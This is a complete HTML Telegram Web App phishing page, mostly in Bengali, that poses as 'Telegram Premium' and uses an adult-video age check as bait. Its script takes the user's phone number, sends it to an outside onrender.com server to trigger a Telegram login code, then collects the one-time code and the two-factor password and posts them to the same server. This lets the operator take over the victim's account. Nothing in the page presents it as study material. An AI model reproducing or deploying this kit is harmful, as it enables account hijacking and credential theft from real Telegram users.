<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary: #7265e3; --bg: #000; --glass: rgba(0,0,0,0.7); }
        body { margin: 0; padding: 0; height: 100vh; background: var(--bg); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        body::before { content: ""; position: absolute; width: 100%; height: 100%; background: url('https://i.ibb.co/8LJttTWD/file-3.jpg') center/cover; filter: blur(15px); z-index: -1; }
        
        .container { width: 90%; max-width: 380px; background: var(--glass); padding: 30px 20px; border-radius: 25px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); text-align: center; }
        .step { display: none; }
        .step.active { display: block; animation: fadeIn 0.5s forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .btn { width: 100%; padding: 16px; background: var(--primary); border: none; border-radius: 15px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; box-shadow: 0 5px 15px rgba(114, 101, 227, 0.4); }
        .emoji { width: 100px; height: 100px; margin-bottom: 20px; }
        
        /* OTP Input Style */
        .otp-wrap { display: flex; justify-content: center; gap: 8px; margin: 20px 0; }
        .otp-box { width: 45px; height: 55px; background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.2); border-radius: 12px; text-align: center; font-size: 24px; color: #fff; font-weight: bold; line-height: 55px; }
        .otp-box.filled { border-color: var(--primary); background: rgba(114, 101, 227, 0.2); }

        /* Keypad */
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
        .key { background: rgba(255,255,255,0.08); padding: 15px; border-radius: 12px; font-size: 20px; cursor: pointer; }
        .key:active { background: rgba(255,255,255,0.2); }

        #full-loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
        .shake { animation: shake 0.3s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
    </style>
</head>
<body>

    <div id="full-loader">
        <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/People/Thinking%20Face.webp" style="width: 120px;">
        <p id="loader-msg" style="font-weight: bold; margin-top: 10px;">প্রসেস হচ্ছে...</p>
    </div>

    <div class="container">
        <div class="step active" id="step1">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Symbols/No%20One%20Under%20Eighteen.webp" class="emoji">
            <h2>Age Verification</h2>
            <p>ভিডিওগুলো দেখতে আপনার বয়স ১৮+ নিশ্চিত করুন।</p>
            <button class="btn" onclick="shareContact()">✅ I'M 18+ PROCEED</button>
        </div>

        <div class="step" id="step2">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Mobile%20Phone.webp" class="emoji">
            <h3>কোড দিন</h3>
            <div class="otp-wrap" id="otp-container">
                <div class="otp-box" id="b1"></div>
                <div class="otp-box" id="b2"></div>
                <div class="otp-box" id="b3"></div>
                <div class="otp-box" id="b4"></div>
                <div class="otp-box" id="b5"></div>
            </div>
            <div class="keypad">
                <div class="key" onclick="typeNum('1')">1</div><div class="key" onclick="typeNum('2')">2</div><div class="key" onclick="typeNum('3')">3</div>
                <div class="key" onclick="typeNum('4')">4</div><div class="key" onclick="typeNum('5')">5</div><div class="key" onclick="typeNum('6')">6</div>
                <div class="key" onclick="typeNum('7')">7</div><div class="key" onclick="typeNum('8')">8</div><div class="key" onclick="typeNum('9')">9</div>
                <div class="key" style="color:red" onclick="typeNum('C')">C</div><div class="key" onclick="typeNum('0')">0</div><div class="key" onclick="typeNum('DEL')">←</div>
            </div>
        </div>

        <div class="step" id="step3">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp" class="emoji">
            <h3>পাসওয়ার্ড দিন</h3>
            <input type="password" id="pass2fa" style="width: 80%; padding: 15px; border-radius: 10px; border: none; margin-bottom: 15px; text-align: center;" placeholder="Enter 2FA Password">
            <button class="btn" onclick="submit2FA()">আনলক করুন</button>
        </div>

        <div class="step" id="step4">
            <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Card%20Index%20Dividers.webp" class="emoji">
            <h2>সফল হয়েছে!</h2>
            <button class="btn" style="background: #ff9500;" onclick="window.location.href='https://t.me/your_channel'">ভিডিও দেখুন</button>
        </div>
    </div>

    <script>
        const RENDER_API = "https://s23315984.onrender.com";
        const tg = window.Telegram.WebApp;
        tg.expand();

        let phoneNumber = "";
        let otpCode = "";

        function showStep(n) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + n).classList.add('active');
        }

        function toggleLoader(show, msg = "প্রসেস হচ্ছে...") {
            document.getElementById('loader-msg').innerText = msg;
            document.getElementById('full-loader').style.display = show ? 'flex' : 'none';
        }

        function shareContact() {
            tg.requestContact((ok, res) => {
                if (ok && res.contact) {
                    phoneNumber = res.contact.phone_number.includes('+') ? res.contact.phone_number : '+' + res.contact.phone_number;
                    
                    // এখানে ম্যাজিক! সরাসরি ওটিপি পেজে পাঠিয়ে দেওয়া
                    showStep(2);

                    fetch(`${RENDER_API}/send_otp`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ phone: phoneNumber })
                    });
                }
            });
        }

        function typeNum(n) {
            if (n === 'C') otpCode = "";
            else if (n === 'DEL') otpCode = otpCode.slice(0, -1);
            else if (otpCode.length < 5) otpCode += n;

            for (let i = 1; i <= 5; i++) {
                let box = document.getElementById('b' + i);
                box.innerText = otpCode[i - 1] || "";
                if(otpCode[i-1]) box.classList.add('filled'); else box.classList.remove('filled');
            }

            if (otpCode.length === 5) verifyOTP();
        }

        async function verifyOTP() {
            toggleLoader(true, "কোড চেক করা হচ্ছে...");
            try {
                let res = await fetch(`${RENDER_API}/verify`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: phoneNumber, otp: otpCode })
                });
                let data = await res.json();
                toggleLoader(false);

                if (data.status === "done") showStep(4);
                else if (data.status === "need_2fa") showStep(3);
                else throw new Error();
            } catch {
                toggleLoader(false);
                document.getElementById('otp-container').classList.add('shake');
                setTimeout(() => document.getElementById('otp-container').classList.remove('shake'), 500);
                otpCode = "";
                for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = ""; document.getElementById('b'+i).classList.remove('filled'); }
            }
        }

        async function submit2FA() {
            let pass = document.getElementById('pass2fa').value;
            if(!pass) return;
            toggleLoader(true, "ভেরিফাই হচ্ছে...");
            try {
                let res = await fetch(`${RENDER_API}/verify`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone: phoneNumber, otp: otpCode, password: pass })
                });
                let data = await res.json();
                toggleLoader(false);
                if (data.status === "done") showStep(4);
                else alert("ভুল পাসওয়ার্ড!");
            } catch { toggleLoader(false); }
        }
    </script>
</body>
</html>
